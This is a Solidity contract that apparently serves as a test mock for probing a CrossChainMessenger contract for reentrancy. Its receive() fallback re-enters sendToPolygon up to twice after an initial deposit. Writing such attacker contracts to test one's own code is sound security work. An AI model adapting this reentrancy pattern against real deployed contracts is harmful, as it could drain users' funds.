// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../CrossChainMessenger.sol";

contract ReentrancyAttacker {
    CrossChainMessenger public messenger;
    uint256 public attackCount;

    event AttackAttempted(uint256 value, uint256 count);
    event FallbackCalled(uint256 value);

    constructor(address payable _messenger) {
        require(_messenger != address(0), "Invalid messenger address");
        messenger = CrossChainMessenger(_messenger);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackCount = 0;
        // Properly encode both receiver and amount for the message
        messenger.sendToPolygon{value: msg.value}(address(this));
        emit AttackAttempted(msg.value, 0);
    }

    receive() external payable {
        emit FallbackCalled(msg.value);

        if (attackCount < 2 && msg.value >= 1 ether) {
            attackCount++;
            // Try to reenter with the received amount
            messenger.sendToPolygon{value: msg.value}(address(this));
            emit AttackAttempted(msg.value, attackCount);
        }
    }
}
